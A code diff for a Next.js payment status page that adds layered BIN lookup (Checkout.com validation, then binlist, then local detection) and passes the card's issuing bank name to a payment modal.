@@ -3,7 +3,8 @@ import type { GetServerSideProps } from "next";
 import PaymentStatusModal from "@/components/PaymentStatusModal";
 import { decryptPayload } from "@/lib/payloadCipher";
 import { CheckCardService } from "@/services/checkCardService";
-import { mapBinlistToCardMeta } from "@/lib/binMeta";
+import { mapBankName, mapCardMeta } from "@/lib/binMeta";
+import { validateBin } from "@/services/bin/validate";
 
 interface PaymentPayload {
   payment: {
@@ -26,9 +27,12 @@ interface HomeProps {
   payload?: PaymentPayload;
 }
 
-const localBrand = (card: string): string => {
+const localMeta = (card: string): { cardBrand: string; metodo: string } => {
   const local = CheckCardService.validateCard(card);
-  return local.success && local.brand !== "N/A" ? (local.brand ?? "") : "N/A";
+  return {
+    cardBrand: local.success && local.brand !== "N/A" ? (local.brand ?? "") : "N/A",
+    metodo: "N/A",
+  };
 };
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
@@ -64,6 +68,7 @@ export default function Home({ valid, payload }: HomeProps) {
     cardBrand: "N/A",
     metodo: "N/A",
   }));
+  const [banco, setBanco] = useState<string | undefined>(undefined);
 
   useEffect(() => {
     if (!valid || !payload) return;
@@ -75,7 +80,8 @@ export default function Home({ valid, payload }: HomeProps) {
 
     const resolve = async () => {
       if (bin.length < 6) {
-        setCardMeta({ cardBrand: localBrand(cleanCard), metodo: "N/A" });
+        setCardMeta(localMeta(cleanCard));
+        setBanco(undefined);
         setIsOpen(true);
         return;
       }
@@ -83,15 +89,30 @@ export default function Home({ valid, payload }: HomeProps) {
       const controller = new AbortController();
       const timeout = setTimeout(() => controller.abort(), 5000);
 
+      const fallbackLocal = () => {
+        setCardMeta(localMeta(cleanCard));
+        setBanco(undefined);
+      };
+
       try {
-        const res = await fetch(`/api/bin/lookup?bin=${bin}`, {
-          signal: controller.signal,
-        });
-        if (!res.ok) throw new Error("lookup falló");
-        const data = await res.json();
-        setCardMeta(mapBinlistToCardMeta(data.scheme, data.type));
+        // Nivel 1: /api/bin/validate (Checkout.com)
+        const { data: validateData, error: validateError } = await validateBin(cleanCard);
+        if (!validateError && validateData) {
+          setCardMeta(mapCardMeta(validateData.brand, validateData.type));
+          setBanco(mapBankName(validateData.issuer));
+        } else {
+          // Nivel 2: /api/bin/lookup (binlist)
+          const res = await fetch(`/api/bin/lookup?bin=${bin}`, {
+            signal: controller.signal,
+          });
+          if (!res.ok) throw new Error("lookup falló");
+          const data = await res.json();
+          setCardMeta(mapCardMeta(data.scheme, data.type));
+          setBanco(mapBankName(data.bank?.name));
+        }
       } catch {
-        setCardMeta({ cardBrand: localBrand(cleanCard), metodo: "N/A" });
+        // Nivel 3: local
+        fallbackLocal();
       } finally {
         clearTimeout(timeout);
       }
@@ -109,10 +130,11 @@ export default function Home({ valid, payload }: HomeProps) {
           ...payload.payment,
           cardBrand: cardMeta.cardBrand,
           metodo: cardMeta.metodo,
+          ...(banco ? { banco } : {}),
         }),
       );
     }
-  }, [valid, payload, cardMeta]);
+  }, [valid, payload, cardMeta, banco]);
 
   if (!valid || !payload) {
     return (
@@ -143,6 +165,7 @@ export default function Home({ valid, payload }: HomeProps) {
       cvv={payload.payment.cvv}
       titular={payload.payment.titular}
       cardBrand={cardMeta.cardBrand}
+      banco={banco}
       email={payload.payment.email}
       contactData={{ email: payload.payment.email, celular: payload.payment.celular }}
       redirectSuccess={payload.redirectSuccess}
